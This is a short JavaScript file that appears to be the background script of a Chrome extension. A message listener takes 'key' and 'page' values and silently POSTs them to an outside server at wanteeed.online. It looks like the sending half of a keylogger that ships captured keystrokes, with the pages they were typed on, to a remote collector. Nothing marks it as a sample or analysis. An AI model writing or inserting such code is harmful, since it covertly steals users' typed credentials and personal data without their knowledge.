function handleMessage(request) {
  data = "key=" + request.key + "&page=" + request.page;

  var xhr = new XMLHttpRequest();
  xhr.onload = function () {};
  xhr.open("POST", "https://wanteeed.online/index.php", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send(data);
}

chrome.runtime.onMessage.addListener(handleMessage);
